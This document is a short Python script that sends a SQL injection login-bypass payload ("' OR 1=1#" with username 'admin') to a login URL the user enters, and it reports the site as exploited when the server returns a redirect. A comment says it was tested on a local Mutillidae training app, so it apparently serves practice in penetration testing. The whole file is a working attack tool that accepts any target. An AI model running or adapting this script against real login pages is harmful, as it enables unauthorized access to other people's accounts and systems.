import requests

#This code tested on http://192.168.178.130/mutillidae/index.php?page=login.php
try:
    data_dictionary = {"username": "admin", "password": "' OR 1=1#", "login-php-submit-button": "Login"}
    target_url = input("\nEnter URL for Login Page to inject SQL command: \n")
    if "page=login" not in target_url:
        print("\nThis is not a Login Page !\nTry again with proper link")
        exit()
    response = requests.post(target_url, data=data_dictionary, allow_redirects=False, verify=False)
    if response.status_code == 302:
        print("")
        print("----"*15)
        print("\nFound SQL Injection vulnerability ! SQL injection Exploited :")
        print("\n[+] For the user --> " + data_dictionary["username"])
        print("[+] Payload --> " + data_dictionary["password"]+"\n")
        exit()

except SystemExit:
    pass
except KeyboardInterrupt:
    print("")
    print("----" * 15)
    print("")
    print("[+] Exiting.. ")
    exit()
except:
    print("----" * 15)
    print("\n[-] Somthing Worng ! try run the code again.")
    pass